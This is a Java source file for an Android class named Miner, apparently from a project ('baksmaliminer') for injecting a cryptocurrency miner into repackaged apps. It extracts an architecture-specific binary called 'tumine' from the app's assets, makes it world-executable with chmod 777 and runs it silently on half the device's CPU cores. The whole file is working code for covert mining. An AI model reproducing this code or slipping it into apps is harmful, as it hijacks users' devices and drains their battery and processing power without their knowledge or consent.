package its.name.baksmaliminer;

import android.content.Context;
import android.os.Build;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;

public class Miner {
    public static Process process = null;
    public static Context context;

    public Miner(Context context) {
        Miner.context = context;
    }

    public void action(Boolean start) {
        if (start) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    try {
                        if (process != null) {
                            process.destroy();
                        }

                        File outputFile = new File(context.getFilesDir().getAbsolutePath(), "tumine");
                        if (!outputFile.exists()) {

                            String[] abis;
                            String file = null;

                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                abis = Build.SUPPORTED_ABIS;
                            } else {
                                abis = new String[]{Build.CPU_ABI, Build.CPU_ABI2};
                            }
                            for (String abi2 : abis) {
                                String abi = abi2.toLowerCase();
                                if (abi.contains("arm64-v8a")) {
                                    file = "tumine64arm";
                                    break;

                                } else if (abi.contains("x86")) {
                                    file = "tumine86";
                                    break;

                                } else if (abi.contains("armeabi-v7a")) {
                                    file = "tumine86arm";
                                    break;
                                }

                            }
                            if (file == null) {
                                return;
                            }
                            InputStream is;
                            is = context.getAssets().open(file);

                            OutputStream out = new FileOutputStream(outputFile);
                            outputFile.createNewFile();
                            byte[] buffer = new byte[8 * 1024];
                            int bytes = is.read(buffer);
                            while (bytes >= 0) {
                                out.write(buffer, 0, bytes);
                                bytes = is.read(buffer);
                            }
                            out.flush();
                            out.close();
                            //make the executable executable with chmod
                            Process chmod = Runtime.getRuntime().exec("/system/bin/chmod 777 " + outputFile);
                            chmod.waitFor();
                        }
                        int threads = Runtime.getRuntime().availableProcessors();
                        if (threads <= 1) threads = 1; else threads /= 2;
                        String args = "part1" + threads + "part2";
                        ProcessBuilder pb = new ProcessBuilder(outputFile.getAbsolutePath(), args);
                        try {
                            process = pb.start();
                            process.waitFor();
                        } catch (Exception e) {
                            e.printStackTrace();
                        }
                    } catch (Throwable ex) {
                        ex.printStackTrace();
                    }
                }
            }).start();
        } else {
            try {
                if (process != null) {
                    process.destroy();
                }
                process = null;
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }
}
